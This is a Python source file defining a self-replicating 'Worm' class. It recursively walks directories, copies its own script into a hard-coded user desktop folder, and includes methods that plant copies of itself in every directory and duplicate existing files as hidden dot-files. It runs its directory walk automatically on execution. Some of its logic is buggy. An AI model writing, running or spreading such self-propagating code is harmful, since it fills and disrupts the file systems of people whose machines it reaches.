import os
import shutil
import time

class Worm:

    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path

        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration

        # get own absolute path
        self.own_path = os.path.realpath(__file__)


    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                    copied_script_name = '1' + '_' + os.path.basename(__file__)
                    shutil.copy(__file__, "C:\\Users\\maddi\\Desktop\\worm" + os.sep + copied_script_name)
                    print(absolute_path)
                else:
                    continue


    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, "\1.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)


    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)






    def start_worm_actions(self):
        self.list_directories(self.path)



xbnumba=1

if xbnumba==1:
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.start_worm_actions()
